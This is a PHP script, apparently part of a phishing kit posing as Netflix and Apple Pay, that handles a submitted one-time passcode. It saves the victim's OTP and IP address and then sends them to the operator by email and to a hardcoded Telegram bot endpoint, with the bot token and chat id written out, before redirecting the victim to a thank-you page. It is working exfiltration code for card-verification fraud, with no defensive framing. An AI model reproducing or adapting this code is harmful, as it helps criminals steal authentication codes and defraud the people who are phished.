<?php
  error_reporting(0);
  ob_start();
  session_start();
  include '../../Settings.php';
  include '../../ip.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['otp']  = $_POST['otp'];
  $_SESSION['step_six']  = true;
header('location: ../merci.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
	
$message = "
          
 ㅤ
[📱] Apple Pay [📱]

✔️ Apple Pay : ".$_SESSION['otp']."
🗑 Adresse IP : "._ip()."

          ";

$Subject=" 「📱」+1 VBV Apple Pay From "._ip()."|🎯 ";
$head="From: (っ◔◡◔)っ ❤ TYNOX N3TFLIX 🍓 <cc@sdf.cash>";
if ($mail_sending == true) {
  mail($my_mail,$Subject,$message,$head);
}
if ($telegram_sending == true) {
  $messagetelegram = urlencode("".$message."");
file_get_contents("https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-896912896&text=" . urlencode($message)."" );
$mssagetelegram = urlencode("".$message."");
$mssagetelegram = urlencode("".$message."");

      }

}
else
{
  header('location: ../../login.php');
}

?>
